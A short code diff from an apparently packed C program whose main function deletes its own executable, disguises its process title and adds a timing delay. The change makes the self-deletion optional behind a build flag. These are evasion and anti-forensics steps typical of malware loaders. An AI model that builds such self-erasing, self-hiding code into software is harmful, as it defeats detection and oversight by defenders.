@@ -242,7 +242,9 @@ int main(int argc, char* argv[], char* envp[]) {
         return 1;
     }
 
+#ifndef KEEP_PACKED_FILE
     unlink(argv[0]);
+#endif
     hide_process_title(argc, argv);
 
     noise_delay(150);
